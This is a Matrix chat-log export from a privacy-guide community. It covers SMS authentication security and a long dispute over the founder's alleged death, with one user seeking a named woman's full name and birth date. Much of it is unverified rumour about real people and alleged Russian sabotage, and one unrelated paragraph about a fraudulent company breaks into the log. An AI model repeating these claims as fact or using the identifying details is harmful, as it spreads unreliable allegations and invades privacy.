24.4.2022, 16:51:15 - Astarael: if the user can't handle a passwrod manager he should hire a guy to manage his accounts

24.4.2022, 16:55:13 - SamLeh: But high security sites usually don't allow anyway weak authentication, which means that you'll need to use proper public / private key for login. Which of course can also be provided by FIDO2. But TOTP is way too weak.
24.4.2022, 16:55:54 - Astarael: if the user can't recognize the phishing link in the first place he'll not care for password manager

24.4.2022, 16:57:38 - SamLeh: As example I don't remember seeing even one international site using strong SMS auth... Ever... 
24.4.2022, 16:58:05 - styx: what is considered strong sms authentication?
24.4.2022, 16:58:13 - 0xbad1dea: there is none
24.4.2022, 16:58:15 - SamLeh: 128 - 256 bit security.
24.4.2022, 16:58:25 - Astarael: lmao
24.4.2022, 16:58:39 - Astarael: 256-bit sms encryption
24.4.2022, 16:59:05 - SamLeh: The Finnish one is, it sends nonce (with human readable ID), which you'll sign with private key and send back... And the private key is kept in SIM card HSM module.
24.4.2022, 16:59:33 - Astarael: way too tedious
24.4.2022, 16:59:38 - styx: i've heard of people saying not to use sms authentication at all if possible but at this point, i'm better off not assuming that i know things
24.4.2022, 16:59:41 - Astarael: and how do they calculate the nonce?
24.4.2022, 16:59:48 - Astarael: there should be a counter
24.4.2022, 17:00:12 - 0xbad1dea: <@sl:envs.net "The Finnish one is, it sends non..."> certainly better than most which just send a TOTP
24.4.2022, 17:00:16 - SamLeh: <@astarael:fairydust.space "and how do they calculate the no..."> Haven't actually checked, it's probably counter or 100% random. 
24.4.2022, 17:00:29 - 0xbad1dea: in _that_ setup there is some level of actual security
24.4.2022, 17:00:38 - Astarael: I don't trust banks do to cryptography properly
24.4.2022, 17:00:47 - Astarael: pretty sure its a fixed nonce
24.4.2022, 17:01:03 - Astarael: make your bank open-source it lol
24.4.2022, 17:01:54 - SamLeh: Well, I'm pretty sure they've paid attention to the requirements, because failing to do authentication properly would be pretty extremely bad case for them. Just like CA leaking CA private keys. 
24.4.2022, 17:02:36 - SamLeh: But there has been secondary problems, like the HSM having bad(ish) reandom number generator. Which then leads to more or less guessable private keys... There are so many ways to ruin things. 
24.4.2022, 17:02:57 - SamLeh: https://www.schneier.com/blog/archives/2017/09/security_flaw_i.html
24.4.2022, 17:02:58 - 0xbad1dea: Security is hard
24.4.2022, 17:03:08 - Alexa,SaveThePlanet: and they kinda have the resources ...
24.4.2022, 17:03:44 - SamLeh: But in general I like the idea that private key is kept in HSM and HSM signs the nonce... It makes (ahem, SHOULD MAKE) things more secure.
24.4.2022, 17:04:13 - SamLeh: Here's small blog post I made about secure SMS auth - https://www.sami-lehtinen.net/blog/secure-pki-based-mobile-user-id-authentication and if anyone got more technical questions, RTFM - https://mobiilivarmenne.fi/wp-content/uploads/2017/05/MSS_FiCom_Implementation_guideline.pdf

26.4.2022, 13:49:17 - Trolljegeren: Ideally we would need full name and dob
26.4.2022, 13:50:14 - Trolljegeren: then at least they could probably tell us "where she is" without breaking the medical secrecy
26.4.2022, 13:52:36 - Trolljegeren: so "Lean xxxxxxxxx" , age 22, dob "xx/xx/2000-2001-1999" depending on which month she was born into

27.4.2022, 14:03:05 - Trolljegeren: The interpol dude you don't believe exist came yesterday in a different room and explained he had the death certificate but couldn't share it because he's doing everything off the book and doesn't want to lose his job 
27.4.2022, 14:03:32 - Trolljegeren: I tested him by talking to him in french which I can confirm ... he's french as he claimed
27.4.2022, 14:03:48 - Trolljegeren: weren't you there btw?
27.4.2022, 14:04:08 - Trolljegeren: I'm fairly certain you were in the room when he joined
27.4.2022, 14:04:43 - nenetl: "bro speaks french believe me it's off the books"
27.4.2022, 14:04:58 - nenetl: you must think we're this stupid 
27.4.2022, 14:05:10 - Trolljegeren: You must have a very difficult life if you are like that with everyone?
27.4.2022, 14:05:39 - nenetl: you're doing such a great job of proving your credibility here
27.4.2022, 14:05:51 - Trolljegeren: AnonyPla died? AnonyPla faked her death? So what? 
27.4.2022, 14:05:52 - nenetl: first with banning me for...what exactly? Confronting your motives?
27.4.2022, 14:05:53 - Alexa,SaveThePlanet: I do am be quite impressed by the number of languages you know mr.
27.4.2022, 14:05:56 - Trolljegeren: The result is the same, she's gone
27.4.2022, 14:06:04 - Trolljegeren: and not coming back it seems
27.4.2022, 14:06:33 - Trolljegeren: So what?
27.4.2022, 14:06:35 - Trolljegeren: What's your issue?
27.4.2022, 14:06:59 - Trolljegeren: The 2000€ fund for the cremation? You think all this was a scam? 
27.4.2022, 14:07:48 - Trolljegeren: AnonyPla was running 4 Tor Exit nodes, 1 Matrix server, 1 onion server, bought a domain name up until 2029 (anonymousplanet.org) and mail hosting at protonmail up to about the same time 
27.4.2022, 14:07:59 - Trolljegeren: All of that is gone 
27.4.2022, 14:08:14 - Trolljegeren: Of course the project needs "some funding" 
27.4.2022, 14:08:29 - Alexa,SaveThePlanet: She didin't find money to fund it all ig
27.4.2022, 14:08:38 - Alexa,SaveThePlanet: specially being a student ...
27.4.2022, 14:08:55 - Trolljegeren: She has 0.50 XMR remaining 
27.4.2022, 14:09:48 - Trolljegeren: And all donations are logged publicly and there is nothing preventing you from donating and tell the maintainers that you want your donation not used for that cremation thing
27.4.2022, 14:09:52 - Trolljegeren: so here an idea out of the blue
27.4.2022, 14:10:44 - Trolljegeren: what if I propose that instead, they create a second XMR wallet for the cremation funding , donate to the first wallet , it will be used to salvage the project
27.4.2022, 14:10:58 - Trolljegeren: donate to the second wallet , it will be used to pay the cremation
27.4.2022, 14:11:03 - Trolljegeren: how about that?
27.4.2022, 14:11:30 - Trolljegeren: I think that could be a nice idea if you think they're scammers
27.4.2022, 14:11:54 - Alexa,SaveThePlanet: yea, Ig IT in Paris doesn't pay much /shrug
27.4.2022, 14:12:22 - Alexa,SaveThePlanet: plus you have to pay the renting, gets very costly
27.4.2022, 14:13:07 - Trolljegeren: yes Paris is not cheap
27.4.2022, 14:13:59 - Trolljegeren: But I don't live inside the "périphérique" , I'm a commuter from the greater Paris 
27.4.2022, 14:14:33 - Alexa,SaveThePlanet: Ok so you're fine then :)

27.4.2022, 14:15:54 - Alexa,SaveThePlanet: maybe ? it gets hard to keep track of everything

3.5.2022, 22:00:35 - duck ❄️: i really don't want to have to deal with her but she has repeatedly shown herself to not be capable of acting in good faith 
3.5.2022, 22:01:08 - Alexa,SaveThePlanet: something have to have happened to come up to this point, no ? 🤔
3.5.2022, 22:02:28 - duck ❄️: yes, she tarnished her reputation
3.5.2022, 22:03:44 - madaidan.: It's amazing how she has so elaborately ran her own community into the ground

3.5.2022, 22:07:55 - duck ❄️: There was a “collaborative” moderation effort lead by anonypla but she lied about what it actually achieved and continued to lie about it even after she was called out for it
3.5.2022, 22:08:13 - duck ❄️: <@alexa//saveplanet:envs.net "and why so much hate on madaidan..."> He called her a larper
3.5.2022, 22:09:11 - Alexa,SaveThePlanet: <@duck.:matrix.org "There was a “collaborative” mode..."> moderation = being a mod in the room or smthing else ?
3.5.2022, 22:11:54 - duck ❄️: No, she said she put an an abuser/troll we’ve been dealing with behind bars and said she successfully did it but in reality it didn’t happen at all

22.5.2022, 07:56:18 - kentucky fried children: qbw3ykpkzejp: "I want to be clear that I removed my comments not because I was asked but because I wanted certain things to be known about attempts to remove the project; for Lena's connections to the privacy and cybersecurity world; and attempts to discredit her name because of the fact she gave over the keys to the project to someone you might not trust fully. But you shouldn't trust anybody. You should always question everything you read online. The entire fucking point was to create a medium where the topics can be discussed directly and where to start researching those topics. It's a starting point. It can be greater than it is. But it needed to be acknowledged that certain groups of people want to make it very difficult to publish this information. Even if it's just a collection of public information made easily accessible to the masses, it's still a very important resource for many, and that threatens the existence of certain groups that are paid to (and enjoy) making it impossible to be anonymous, safe, transparent and secure."

25.5.2022, 04:21:28 - protowarp: mind explaining the function of matrix protocol as it's called?
25.5.2022, 04:21:53 - protowarp: curious to get a better understanding of it
25.5.2022, 04:27:27 - protowarp: gon use a little paraphrasing analogy to see if i can better understand here. so protocols are like a network that flow sort of like a river where as clients such element would be like a waterwheel to tap into the river as a source to it's function.  is that correct?
25.5.2022, 05:20:22 - Maple joined the room
25.5.2022, 07:05:53 - qbw3ykpkzejp: A high level explanation is that Matrix is protocol which is used by the application (client). Matrix is the medium and Element and other clients are the vessels.

25.5.2022, 07:26:33 - qbw3ykpkzejp: Fortunately, some accounts such as the web hosting were recovered through tickets at the provider
25.5.2022, 07:27:47 - qbw3ykpkzejp: She only trusted a few people with the project and those were given access but some accounts were archived in memoriam

25.5.2022, 07:31:32 - qbw3ykpkzejp: She gave her accounts to a trusted individual before she died and Babba came into the picture to run the Guide repos

25.5.2022, 07:35:39 - qbw3ykpkzejp: My Github was taken down last month so I re-uploaded onto Gitlab and Github and other gitea mirrors not linked to the accounts directly
25.5.2022, 07:35:54 - Maple: I had a wild conspiracy theory a few day ago that this superalex dude was someone who gets paid to disrupt these communities and make them seem hostile. Doesn't seem so far fetched anymore when you've actively got governments against you.
25.5.2022, 07:36:18 - qbw3ykpkzejp: He is either a troll or a paid disinformation expert

25.5.2022, 07:36:49 - manonthemoon: Was Lena attacked because of the project?

25.5.2022, 07:37:21 - qbw3ykpkzejp: No, she went to UKR to give aid to some individuals and their busses were attacked by armed military
25.5.2022, 07:37:41 - qbw3ykpkzejp: She suffered at least one GSW and was lifted to a hospital
25.5.2022, 07:38:00 - qbw3ykpkzejp: She later died after contacting some friends and giving her last wishes

25.5.2022, 07:41:18 - qbw3ykpkzejp: Yes, it's possible she was a member of the press or at least pretending to be, but I haven't confirmed.
25.5.2022, 07:41:46 - qbw3ykpkzejp: I likely won't ever recover the name of the hospital she was lifted to or her team members.
25.5.2022, 07:42:04 - qbw3ykpkzejp: It's hard to pinpoint exactly where in the city she was relocated from, or to where.

25.5.2022, 07:42:48 - qbw3ykpkzejp: I am only going off information given to me by trusted sources, but they were able to confirm that her online identities did travel to UKR and went silent, down to the day of the attack.
25.5.2022, 07:43:12 - qbw3ykpkzejp: For transparency, I am ex-military (ARMY 35N), that's all I will ever share here.
25.5.2022, 07:43:46 - Maple: Do you think this is why they're trying to shut down the project? Trying to erase this person, make sure the story doesn't spread?
25.5.2022, 07:44:10 - Maple: Or is it unrelated, just two shitstorms happening simultaneously?
25.5.2022, 07:44:53 - qbw3ykpkzejp: The people after the project are probably RUS military special forces trying to find out info about people involved to shut it down and stop it from helping secure and anonymize civilians in war zones especially the UKR warzone.
25.5.2022, 07:45:06 - supergeo44: <@qbw3ykpkzejp:magdeburg.jetzt "For transparency, I am ex-milita..."> Yeah and I'm Edward Snowden didnt you know?
25.5.2022, 07:45:40 - qbw3ykpkzejp: As such, it has created a lot of distrust and conspiracy theories involving her disappearance, her team's disappearance and questions about her true motives.
25.5.2022, 07:46:16 - manonthemoon: If someone she knew tried to corrupt the project it might be possible? But it seems more likely to be unrelated.
25.5.2022, 07:46:16 - manonthemoon: Why did someone try to corrupt the project if they knew Lena?
25.5.2022, 07:46:16 - qbw3ykpkzejp: I've waited a long time for someone to finally ask here.
25.5.2022, 07:46:57 - qbw3ykpkzejp: Her friend, the one controlling her AnonyPla accounts (mainly Twitter), was a female friend she was very close to IRL.
25.5.2022, 07:47:25 - qbw3ykpkzejp: They have tried to sabotage the project to get everyone away from it and protect those involved before and now.

Hey. People are spreading the word about this defunct company that Rob mentioned. Rob regrets it. They do not exist as a real business. No service. Taking peoples money. Yaddiyah. Take care!
25.5.2022, 07:47:51 - qbw3ykpkzejp: They have gone by many alts here and on Twitter, and have since gone quiet.
25.5.2022, 07:48:45 - qbw3ykpkzejp: It's better that the project member count stay this low for the safety of those involved. Compartmentalizing is key, as you might expect.

25.5.2022, 07:50:13 - manonthemoon: <@qbw3ykpkzejp:magdeburg.jetzt "They have tried to sabotage the ..."> What was her motivation for this?
25.5.2022, 07:50:28 - qbw3ykpkzejp: To maintain the safety of Lena's contacts.
25.5.2022, 07:51:14 - qbw3ykpkzejp: These are very private individuals like myself, with several backups and contingencies in place in the event the project is sabotage again, or one of us goes missing.
25.5.2022, 07:52:28 - manonthemoon: <@qbw3ykpkzejp:magdeburg.jetzt "To maintain the safety of Lena's..."> Oh so she was scared that identities would be revealed
25.5.2022, 07:53:18 - qbw3ykpkzejp: It is likely that has happened, the attacks on the project maintainers were about a month ago and have driven away all subsequent developers of the guide.
25.5.2022, 07:54:05 - qbw3ykpkzejp: The entire team from the AnonymousPlanet-ng repo were driven away because of the actions of someone calling themselves The Green Fairy, likely an alt of Lena's friend.

25.5.2022, 07:57:49 - manonthemoon: Thanks for answering all these questions btw.
25.5.2022, 07:58:35 - manonthemoon: I'm also curious about the attacks by Russia. How exactly did they try to destroy the project?
25.5.2022, 08:01:41 - qbw3ykpkzejp: It's complicated. Lena was involved in a lot of things including humanitarian aid efforts in the region.
25.5.2022, 08:02:42 - qbw3ykpkzejp: She was not sufficiently protected on the ground. She was part of an outfit with no military protection or local police escort, which is why I suspect Press
25.5.2022, 08:03:44 - qbw3ykpkzejp: The government is actively seeking out all activity pertaining to journalist and press and whistleblowing and the guide helps to circumvent the risks involved in such activity.
25.5.2022, 08:05:14 - qbw3ykpkzejp: And this isn't the US, this is RUS and the laws and penalties there are very severe. The RUS government partnered with the local police so the police report things like activism and hacktivism to them instead of opening cases.
25.5.2022, 08:05:42 - qbw3ykpkzejp: Which is why it's incredibly difficult for even someone with militia and military contacts to find details of her team's whereabouts.
25.5.2022, 08:06:18 - qbw3ykpkzejp: Things like Briar are being used extensively by protestors of the war effort.
25.5.2022, 08:07:41 - qbw3ykpkzejp: In other words this guide makes it difficult for the government to make arrests and even find activist activity.
25.5.2022, 08:07:48 - manonthemoon: So how did the gov know that Lena was with them?
25.5.2022, 08:08:47 - qbw3ykpkzejp: I don't know the answer to that, I only know that she was very careful who she told about her travels and that the group was attacked by RUS forces in the region.
25.5.2022, 08:11:26 - qbw3ykpkzejp: I guess it is possible they knew of her location because her group had poor OPSEC. I can't say exactly how. It could just be wrong place wrong time.
25.5.2022, 08:14:38 - manonthemoon: How's the state of the project so far? Is it possible that Baba can give you mod?
25.5.2022, 08:15:17 - qbw3ykpkzejp: I don't want to be a mod, not just because of a troll in the main chat
25.5.2022, 08:16:02 - manonthemoon: I guess more because you seem to be very knowledgeable about the history of the project and cuz the chat is a bit chaotic as well.
25.5.2022, 08:16:02 - Maple: He's here too. Joined when you started telling the story. You probably didn't see it if you have him on ignore.
25.5.2022, 08:16:19 - Maple: He's been doing the usual insulting, doxing, etc. I think he gave up because no one was responding to him.
25.5.2022, 08:16:41 - qbw3ykpkzejp: 🤷
25.5.2022, 08:17:12 - Maple: Have other people asked to moderate? I can see how huge of a risk it is, I'm having second thoughts as well.
25.5.2022, 08:17:22 - Maple: Is there even a need for more people?
25.5.2022, 08:18:13 - qbw3ykpkzejp: For contributors, yes, there's a need for people knowledgeable of anonymity and security concepts, someone to add and update things.
25.5.2022, 08:18:33 - qbw3ykpkzejp: You can apply to be a contributor or mod through Babba.
25.5.2022, 08:18:47 - qbw3ykpkzejp: It's a very simple process.
25.5.2022, 08:21:38 - qbw3ykpkzejp: As for myself, I'm no one. I don't exist. A ghost, as it were.
